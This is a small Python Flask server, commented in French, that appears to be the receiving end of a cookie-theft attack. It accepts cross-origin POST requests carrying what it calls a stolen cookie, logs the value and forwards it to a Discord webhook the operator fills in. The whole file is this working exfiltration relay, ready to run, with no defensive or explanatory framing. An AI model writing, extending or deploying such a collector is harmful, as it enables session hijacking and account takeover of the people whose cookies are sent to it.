from flask import Flask, request
from flask_cors import CORS
import requests
import os
import traceback

app = Flask(__name__)
CORS(app)

WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # Mets ton webhook ici

@app.route("/", methods=["POST"])
def recevoir_cookie():
    try:
        data = request.get_json()
        print("🔍 Données reçues:", data)

        if not data or 'content' not in data:
            print("❌ Requête mal formée : 'content' manquant")
            return "Bad request", 400

        cookie_content = data['content']
        print("🍪 Cookie reçu :", cookie_content)

        discord_data = {"content": cookie_content}
        response = requests.post(WEBHOOK_URL, json=discord_data)

        print("Webhook Discord status:", response.status_code, response.text)

        if response.status_code == 204:
            print("✅ Cookie envoyé au webhook Discord")
            return "Cookie reçu et envoyé", 200
        else:
            print("⚠️ Erreur envoi webhook Discord")
            return "Erreur webhook Discord", 500

    except Exception as e:
        print("🔥 Exception capturée :")
        traceback.print_exc()
        return "Erreur interne", 500

@app.route("/", methods=["GET"])
def accueil():
    return "✅ Serveur backend en ligne", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)